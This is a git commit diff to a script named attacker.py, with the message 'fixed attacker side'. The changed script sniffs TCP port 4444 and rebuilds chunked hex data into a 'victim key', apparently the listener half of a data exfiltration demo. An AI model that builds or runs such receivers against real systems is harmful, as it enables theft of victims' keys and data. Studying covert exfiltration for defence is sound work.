12de31623f3f23b1cce600b5349980129e8e44df
Clay Curtis <clay584@gmail.com>
2021-12-03 12:50:06 -0500

    fixed attacker side

--- attacker.py
+++ attacker.py
@@ -5,13 +5,11 @@ from common import *
 
 
 if __name__ == "__main__":
-    with open("original_hex_string.txt", "r") as f:
-        original_hex_string = f.read()
-
-    packets = sniff(filter="tcp port 4444", timeout=70, iface="eth0")
+    print("Listening for packets for 60 seconds...")
+    packets = sniff(filter="tcp port 4444", timeout=70, iface="ens33")
+    print(f"Received {len(packets)} chunks of data. Reconstructing...")
     reconstructed_hex_string = reconstruct_hex_string(packets)
-    print(original_hex_string)
-    print("----------------------------")
-    print(reconstructed_hex_string)
     reconstructed_victim_key = deser_data(reconstructed_hex_string)
+    print("######### Victim Data Below #########")
     print(reconstructed_victim_key)
+
